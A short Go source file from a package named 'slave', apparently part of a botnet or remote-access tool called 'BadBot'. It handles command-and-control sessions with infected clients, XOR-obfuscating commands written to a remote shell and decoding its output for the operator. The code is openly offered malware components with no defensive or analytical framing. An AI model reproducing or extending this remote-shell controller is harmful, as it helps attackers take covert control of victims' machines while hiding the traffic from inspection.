package slave

import (
	"fmt"
)

// Writes Over to session
func (s *Client) Write(text string) (int, error) {
	return s.Session.Write(xorbytes([]byte(text), s.Xorkey))
}

func (s *Client) exit() {

	delete(Clients, s.Name)
	fmt.Println("[BadBot/exit] Session Closed for Client:", s.Session.RemoteAddr().String())

}

func (s *Client) read() {

	// buffer Made for The Shell
	buf := make([]byte, 1200)

	for {

		// Read from session
		n, err := s.Session.Read(buf)
		if err != nil || n == 0 {
			break
		}

		// write to user
		fmt.Print(string(xorbytes(buf[:n], s.Xorkey)))

	}

}
